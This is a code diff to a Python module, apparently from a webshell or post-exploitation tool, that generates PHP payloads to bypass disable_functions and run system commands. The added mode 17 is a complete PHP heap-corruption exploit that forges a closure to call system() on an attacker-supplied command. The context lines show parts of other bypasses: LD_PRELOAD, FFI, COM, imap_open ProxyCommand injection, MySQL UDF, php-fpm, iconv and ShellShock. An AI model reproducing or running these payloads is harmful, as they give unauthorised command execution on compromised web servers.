@@ -211,7 +211,7 @@ def get_php_system(bdf_mode):
             %s
             return $o;
         }"""
-    if bdf_mode == 2:  # php7-gc
+    elif bdf_mode == 2:  # php7-gc
         return """
         $o=pwn(base64_decode("%s"));
 
@@ -419,7 +419,7 @@ def get_php_system(bdf_mode):
             %s
             return $o;
         }"""
-    if bdf_mode == 3:  # php7-json
+    elif bdf_mode == 3:  # php7-json
         return """
             $cmd = base64_decode("%s");
             $n_alloc = 10; # increase this value if you get segfaults
@@ -677,7 +677,7 @@ def get_php_system(bdf_mode):
             $y = [new Z()];
             json_encode([&$y]);
             $o=$GLOBAL['o'];"""
-    if bdf_mode == 4:  # LD_PRELOAD
+    elif bdf_mode == 4:  # LD_PRELOAD
         return """
             $p="/tmp/%s";
             putenv("cmd=".base64_decode("%s"));
@@ -687,7 +687,7 @@ def get_php_system(bdf_mode):
             $o=file_get_contents($p);
             unlink($p);
             %s"""
-    if bdf_mode == 5:  # FFI
+    elif bdf_mode == 5:  # FFI
         return """
             $f=FFI::cdef("void *popen(const char *command, const char *type);
             int pclose(void * stream);
@@ -698,14 +698,14 @@ def get_php_system(bdf_mode):
             $f->pclose($o);
             $o=hex2bin($d);
             %s"""
-    if bdf_mode == 6:  # COM
+    elif bdf_mode == 6:  # COM
         return """
             $wsh = new COM('WScript.shell');
             $exec = $wsh->exec("cmd /c ".base64_decode("%s"));
             $stdout = $exec->StdOut();
             $o = $stdout->ReadAll();
             %s"""
-    if bdf_mode == 7:  # imap_open
+    elif bdf_mode == 7:  # imap_open
         return """
             if (!function_exists('imap_open')) {print("no imap_open function!");}
             else{$server = "x -oProxyCommand=echo\\t" . base64_encode(base64_decode("%s") . ">/tmp/%s") . "|base64\\t-d|sh}";
@@ -714,7 +714,7 @@ def get_php_system(bdf_mode):
             $o=file_get_contents("/tmp/%s");
             %s
             unlink("/tmp/%s");}"""
-    if bdf_mode == 8:  # MYSQL-UDF
+    elif bdf_mode == 8:  # MYSQL-UDF
         return {"pdo": """"
             try{%s
                 $r=$con->query("select sys_eval(unhex('%s'))");
@@ -734,7 +734,7 @@ def get_php_system(bdf_mode):
                 $r->close();
                 $con->close();
             }"""}
-    if bdf_mode == 9:  # php7-SplDoublyLinkedList
+    elif bdf_mode == 9:  # php7-SplDoublyLinkedList
         return """
             error_reporting(E_ALL);
 
@@ -1054,7 +1054,7 @@ def get_php_system(bdf_mode):
 
             # Trigger the bug on the first list
             $dlls[0]->offsetUnset(0);"""
-    if bdf_mode == 10:  # php-fpm
+    elif bdf_mode == 10:  # php-fpm
         return {
             "gopher": """function curl($url){
                 $ch = curl_init();
@@ -1112,7 +1112,7 @@ def get_php_system(bdf_mode):
                 die('stream_socket_server/stream_socket_accept function not exist');
                 }"""
         }
-    if bdf_mode == 11:  # apache_mod_cgi
+    elif bdf_mode == 11:  # apache_mod_cgi
         return """
             $cmd = base64_decode("%s");
                 $shellcode = "#!/bin/sh\\n";
@@ -1125,7 +1125,7 @@ def get_php_system(bdf_mode):
                 chmod($f, 0777);
                 print($f);
             """
-    if bdf_mode == 12:  # iconv
+    elif bdf_mode == 12:  # iconv
         return """$p="%s";
             putenv("GCONV_PATH=/tmp/");
             putenv("cmd=".base64_decode("%s"));
@@ -1148,12 +1148,12 @@ def get_php_system(bdf_mode):
               new SplFileObject('php://filter/convert.iconv.payload.UTF-8/resource=data://text/plain;base64,MQ==');
             }
         """
-    if bdf_mode == 13:  # FFI-php_exec
+    elif bdf_mode == 13:  # FFI-php_exec
         return """
             $f=FFI::cdef("int php_exec(int type, char *cmd);");
             ob_start();$f->php_exec(3,base64_decode("%s"));$o=ob_get_contents();ob_end_clean();
             %s"""
-    if bdf_mode == 14:  # php7-reflectionProperty
+    elif bdf_mode == 14:  # php7-reflectionProperty
         return """global $abc, $helper;
                 class Test {
                 public HelperHelperHelperHelperHelperHelperHelper $prop;
@@ -1295,7 +1295,7 @@ def get_php_system(bdf_mode):
                 $o=ob_get_contents();
                 ob_end_clean();
         %s"""
-    if bdf_mode == 15:  # php-user_filter
+    elif bdf_mode == 15:  # php-user_filter
         return """
         function pwn($cmd) {
             define('LOGGING', false);
@@ -1478,7 +1478,7 @@ def get_php_system(bdf_mode):
         ob_end_clean();
         %s
         """
-    if bdf_mode == 16:  # ShellShock
+    elif bdf_mode == 16:  # ShellShock
         return """
             function shellshock($cmd) {
                 if(strstr(readlink("/bin/sh"), "bash") != FALSE) {
@@ -1495,3 +1495,150 @@ def get_php_system(bdf_mode):
             ob_end_clean();
             %s
         """
+    elif bdf_mode == 17:  # concat_function
+        return """
+class Helper { public $a, $b, $c; }
+class Pwn {
+    const LOGGING = false;
+    const CHUNK_DATA_SIZE = 0x60;
+    const CHUNK_SIZE = ZEND_DEBUG_BUILD ? self::CHUNK_DATA_SIZE + 0x20 : self::CHUNK_DATA_SIZE;
+    const STRING_SIZE = self::CHUNK_DATA_SIZE - 0x18 - 1;
+
+    const HT_SIZE = 0x118;
+    const HT_STRING_SIZE = self::HT_SIZE - 0x18 - 1;
+
+    public function __construct($cmd) {
+        for($i = 0; $i < 10; $i++) {
+            $groom[] = self::alloc(self::STRING_SIZE);
+            $groom[] = self::alloc(self::HT_STRING_SIZE);
+        }
+
+        $concat_str_addr = self::str2ptr($this->heap_leak(), 16);
+        $fill = self::alloc(self::STRING_SIZE);
+
+        $this->abc = self::alloc(self::STRING_SIZE);
+        $abc_addr = $concat_str_addr + self::CHUNK_SIZE;
+
+        $this->free($abc_addr);
+        $this->helper = new Helper;
+        if(strlen($this->abc) < 0x1337) {
+            return;
+        }
+
+        $this->helper->a = "leet";
+        $this->helper->b = function($x) {};
+        $this->helper->c = 0xfeedface;
+
+        $helper_handlers = $this->rel_read(0);
+
+        $closure_addr = $this->rel_read(0x20);
+
+        $closure_ce = $this->read($closure_addr + 0x10);
+
+        $basic_funcs = $this->get_basic_funcs($closure_ce);
+
+        $zif_system = $this->get_system($basic_funcs);
+
+        $fake_closure_off = 0x70;
+        for($i = 0; $i < 0x138; $i += 8) {
+            $this->rel_write($fake_closure_off + $i, $this->read($closure_addr + $i));
+        }
+        $this->rel_write($fake_closure_off + 0x38, 1, 4);
+        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
+        $this->rel_write($fake_closure_off + $handler_offset, $zif_system);
+
+        $fake_closure_addr = $abc_addr + $fake_closure_off + 0x18;
+
+        $this->rel_write(0x20, $fake_closure_addr);
+        ($this->helper->b)($cmd);
+
+        $this->rel_write(0x20, $closure_addr);
+        unset($this->helper->b);
+    }
+
+    private function heap_leak() {
+        $arr = [[], []];
+        set_error_handler(function() use (&$arr, &$buf) {
+            $arr = 1;
+            $buf = str_repeat("\\x00", self::HT_STRING_SIZE);
+        });
+        $arr[1] .= self::alloc(self::STRING_SIZE - strlen("Array"));
+        return $buf;
+    }
+
+    private function free($addr) {
+        $payload = pack("Q*", 0xdeadbeef, 0xcafebabe, $addr);
+        $payload .= str_repeat("A", self::HT_STRING_SIZE - strlen($payload));
+
+        $arr = [[], []];
+        set_error_handler(function() use (&$arr, &$buf, &$payload) {
+            $arr = 1;
+            $buf = str_repeat($payload, 1);
+        });
+        $arr[1] .= "x";
+    }
+
+    private function rel_read($offset) {
+        return self::str2ptr($this->abc, $offset);
+    }
+
+    private function rel_write($offset, $value, $n = 8) {
+        for ($i = 0; $i < $n; $i++) {
+            $this->abc[$offset + $i] = chr($value & 0xff);
+            $value >>= 8;
+        }
+    }
+
+    private function read($addr, $n = 8) {
+        $this->rel_write(0x10, $addr - 0x10);
+        $value = strlen($this->helper->a);
+        if($n !== 8) { $value &= (1 << ($n << 3)) - 1; }
+        return $value;
+    }
+
+    private function get_system($basic_funcs) {
+        $addr = $basic_funcs;
+        do {
+            $f_entry = $this->read($addr);
+            $f_name = $this->read($f_entry, 6);
+            if($f_name === 0x6d6574737973) {
+                return $this->read($addr + 8);
+            }
+            $addr += 0x20;
+        } while($f_entry !== 0);
+    }
+
+    private function get_basic_funcs($addr) {
+        while(true) {
+            $addr -= 0x10;
+            if($this->read($addr, 4) === 0xA8 &&
+                in_array($this->read($addr + 4, 4),
+                    [20180731, 20190902, 20200930, 20210902])) {
+                $module_name_addr = $this->read($addr + 0x20);
+                $module_name = $this->read($module_name_addr);
+                if($module_name === 0x647261646e617473) {
+                    return $this->read($addr + 0x28);
+                }
+            }
+        }
+    }
+
+    static function alloc($size) {
+        return str_shuffle(str_repeat("A", $size));
+    }
+
+    static function str2ptr($str, $p = 0, $n = 8) {
+        $address = 0;
+        for($j = $n - 1; $j >= 0; $j--) {
+            $address <<= 8;
+            $address |= ord($str[$p + $j]);
+        }
+        return $address;
+    }
+}
+ob_start();
+new Pwn(base64_decode("%s"));
+$o=ob_get_contents();
+ob_end_clean();
+%s
+"""
